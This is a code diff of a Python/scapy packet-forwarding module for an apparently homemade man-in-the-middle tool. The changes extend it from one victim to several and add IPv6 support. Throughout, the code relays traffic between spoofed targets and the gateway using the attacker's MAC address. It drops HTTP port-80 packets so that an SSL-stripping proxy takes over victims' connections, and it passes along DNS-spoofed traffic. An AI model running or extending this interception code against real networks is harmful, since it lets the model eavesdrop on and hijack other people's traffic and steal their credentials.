@@ -1,6 +1,7 @@
 import logging
 from scapy.layers.l2 import Ether, ARP, getmacbyip
 from scapy.layers.inet import IP, TCP, UDP
+from scapy.layers.inet6 import IPv6
 from scapy.all import *  # like f it lmfao
 import threading
 
@@ -10,12 +11,12 @@ logger = logging.getLogger('PacketHandler')
 class PacketHandler:
     """fml"""
 
-    def __init__(self, interface, gateway_ip, target_ip=None):
+    def __init__(self, interface, gateway_ip, target_ips=None):
         self.interface = interface
         self.gateway_ip = gateway_ip
-        self.target_ip = target_ip  # None means we dont target a specific victim
+        self.target_ips = target_ips if target_ips else []
 
-        # If sslstrip it will drop packets to port 8080 for stripping. Lowkeuy hackey but it is what it is im tired
+        # If sslstrip it will drop packets to port 80 for stripping. Lowkeuy hackey but it is what it is im tired
         self.mode = "normal"
 
         # Get our MAC address
@@ -23,12 +24,21 @@ class PacketHandler:
 
         # Resolve MAC addresses
         self.gateway_mac = self._resolve_mac(gateway_ip)
-        self.target_mac = self._resolve_mac(target_ip) if target_ip else None
+
+        self.target_macs = {}
+
+        for target_ip in self.target_ips:
+            mac = self._resolve_mac(target_ip)
+            if mac:
+                self.target_macs[target_ip] = mac
+            else:
+                logger.warning(f"Could not resolve MAC for target {target_ip}")
 
         self.attacker_mac = get_if_hwaddr(interface)
 
         # Get our IP address
         self.local_ip = self._get_interface_ip()
+        self.local_ipv6 = self._get_interface_ipv6()
         self.local_proxy_ip = self.local_ip
 
         self.filters = []  # List of (priority, function) tuples
@@ -43,9 +53,11 @@ class PacketHandler:
         logger.info(f"Interface: {interface}")
         logger.info(f"Our MAC: {self.attacker_mac}")
         logger.info(f"Gateway: {gateway_ip} ({self.gateway_mac})")
-        logger.info(f"Target: {target_ip} ({self.target_mac})")
+        logger.info(f"Targets: {len(target_ips)} hosts")
 
-    # TODO: Pass this in as a param, little brittle the way it is rnow and doesnt work on windows
+        for ip, mac in self.target_macs.items():
+            logger.debug(f"  {ip} -> {mac}")
+
     def _get_interface_ip(self):
         try:
             return get_if_addr(self.interface)
@@ -71,6 +83,24 @@ class PacketHandler:
                             if a.family == socket.AF_INET:
                                 return a.address
             return None
+
+    def _get_interface_ipv6(self):
+        try:
+            import socket
+            import psutil
+            for name, addrs in psutil.net_if_addrs().items():
+                if name == self.interface:
+                    for a in addrs:
+                        if a.family == socket.AF_INET6:
+                            if not a.address.startswith('fe80'):
+                                return a.address
+                    # Return link-local if thats all we have
+                    for a in addrs:
+                        if a.family == socket.AF_INET6:
+                            return a.address
+        except:
+            pass
+        return None
 
     def _resolve_mac(self, ip):
         """Resolve MAC address for an IP"""
@@ -115,8 +145,8 @@ class PacketHandler:
     def _packet_callback(self, packet):
         """Process each sniffed packet"""
         try:
-            # Skip packets without IP layer
-            if not packet.haslayer(IP):
+            # Skip packets without IP(v6) layer, i think actually theres ipv46... but anwyays risky ill try later
+            if not packet.haslayer(IP) and not packet.haslayer(IPv6):
                 return
 
             # Skip our own packets to prevent loops
@@ -150,39 +180,42 @@ class PacketHandler:
             if not packet.haslayer(Ether):
                 return
 
-            src_ip = packet[IP].src
-            dst_ip = packet[IP].dst
+            if packet.haslayer(IP):
+                src_ip = packet[IP].src
+                dst_ip = packet[IP].dst
+            elif packet.haslayer(IPv6):
+                src_ip = packet[IPv6].src
+                dst_ip = packet[IPv6].dst
+            else:
+                return
 
-            # NEVER forward packets destined to our own IP
-            if self.local_ip and dst_ip == self.local_ip:
-                # These packets are for our local services (DNS spoofed traffic)
+            # DoNt forward packets destined to our own IP
+            if (self.local_ip and dst_ip == self.local_ip) or (self.local_ipv6 and dst_ip == self.local_ipv6):
                 return
 
             # Check if we should drop HTTP packets (SSL strip mode)
             if self.mode == "sslstrip" and packet.haslayer(TCP):
                 tcp = packet[TCP]
 
-                # Drop HTTP packets going TO port 8080 (except our proxy's packets)
-                # TODO: Make the port not static like this should all be parametrized to avoid errors
+                # Drop HTTP packets going TO port 80 (except our proxy's packets)
                 if tcp.dport == 80:
-                    # DONT drop packets destined to OUR IP (DNS spoofed), dont forward but dont drop
+                    # Don’t drop packets destined to our proxy (DNS spoofed), just let them through
                     if dst_ip == self.local_proxy_ip:
                         return
 
-                    # Check if this packet is from our proxy (allowed)
+                    # Allow packets from the proxy itself
                     if hasattr(self, 'local_proxy_ip') and src_ip == self.local_proxy_ip:
                         pass
                     else:
-                        # This is victim trying to connect to port 8080 - drop it
-                        # The proxy will handle this connection instead
-                        if src_ip == self.target_ip or dst_ip == self.target_ip:
+                        # Drop any HTTP request from/to any of our targets
+                        if src_ip in self.target_ips or dst_ip in self.target_ips:
                             self.packets_dropped += 1
                             logger.debug(
                                 f"Dropped HTTP packet (proxy handles): {src_ip}:{tcp.sport} -> {dst_ip}:80")
                             return
 
-                # Also drop return packets FROM port 80 to our target (unless from our proxy)
-                if tcp.sport == 80 and dst_ip == self.target_ip:
+                # Drop return HTTP responses FROM port 80 to any of our targets (unless from proxy)
+                if tcp.sport == 80 and dst_ip in self.target_ips:
                     if hasattr(self, 'local_proxy_ip') and packet[Ether].src == self.attacker_mac:
                         pass
                     else:
@@ -197,6 +230,8 @@ class PacketHandler:
             if pkt.haslayer(IP):
                 del pkt[IP].chksum
                 del pkt[IP].len
+
+            # v6 doesnt have checksum at IP layer
             if pkt.haslayer(TCP):
                 del pkt[TCP].chksum
             if pkt.haslayer(UDP):
@@ -205,11 +240,10 @@ class PacketHandler:
             # Determine forwarding direction and set MACs
             forwarded = False
 
-            # Target -> Gateway (or beyond)
-            if self.target_ip and src_ip == self.target_ip:
-                # Check we have gateway MAC
+            # Target -> Gateway (check if source is ANY of our targets)
+            if src_ip in self.target_ips:
                 if not self.gateway_mac:
-                    logger.error("No gateway MAC address!")
+                    logger.error("No gateway MAC address!!")
                     self.packets_dropped += 1
                     return
 
@@ -217,24 +251,23 @@ class PacketHandler:
                 pkt[Ether].src = self.attacker_mac
                 forwarded = True
 
-            # Gateway (or beyond) -> Target
-            elif self.target_ip and dst_ip == self.target_ip:
-                # Check we have target MAC
-                if not self.target_mac:
-                    logger.error("No target MAC address!")
+            # Gateway -> Target (check if dest is ANY of our targets)
+            elif dst_ip in self.target_ips:
+                # Get the specific target's MAC
+                target_mac = self.target_macs.get(dst_ip)
+                if not target_mac:
+                    logger.error(f"No MAC address for target {dst_ip}!")
                     self.packets_dropped += 1
                     return
 
-                pkt[Ether].dst = self.target_mac
+                pkt[Ether].dst = target_mac
                 pkt[Ether].src = self.attacker_mac
                 forwarded = True
 
             if forwarded:
-                # Send the packet
                 sendp(pkt, verbose=0, iface=self.interface)
                 self.packets_forwarded += 1
 
-                # Log interesting packets
                 if packet.haslayer(TCP):
                     if packet[TCP].dport == 443 or packet[TCP].sport == 443:
                         logger.debug(
@@ -253,8 +286,11 @@ class PacketHandler:
             filter_str = f"ip and ether src not {self.attacker_mac}"
 
             # Add target filter if specified
-            if self.target_ip:
-                filter_str += f" and (src host {self.target_ip} or dst host {self.target_ip})"
+            if self.target_ips:
+                target_filters = []
+                for ip in self.target_ips:
+                    target_filters.append(f"(src host {ip} or dst host {ip})")
+                filter_str += f" and ({' or '.join(target_filters)})"
 
             logger.info(f"Starting packet sniffer with filter: {filter_str}")
 
